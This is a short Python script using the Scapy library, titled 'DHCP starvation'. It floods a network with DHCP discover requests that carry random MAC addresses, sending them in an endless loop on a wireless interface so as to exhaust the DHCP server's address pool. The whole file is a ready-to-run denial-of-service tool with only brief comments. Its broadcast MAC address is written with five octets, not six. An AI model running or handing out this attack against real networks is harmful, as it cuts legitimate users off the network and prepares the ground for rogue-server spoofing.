#DHCP starvation

from scapy.all import *

#The response IP is not checked against the sending IP
conf.checkIPaddr = False

#UDP source port 68 is the DHCP/Bootp Port
#UDP destination port 67 is the DHCP/Bootp Port

dhcp_discover = Ether(dst='ff:ff:ff:ff:ff', src=RandMAC()) \
			/IP(src='0.0.0.0', dst='255.255.255.255') \
			/UDP(sport=68, dport=67) \
			/BOOTP(op=1, chaddr=RandMAC()) \
			/DHCP(options=[('message-type', 'discover'), ('end')])

#verbose output, to see what's going on
sendp(dhcp_discover, iface='wlan0', loop=1, verbose=1)
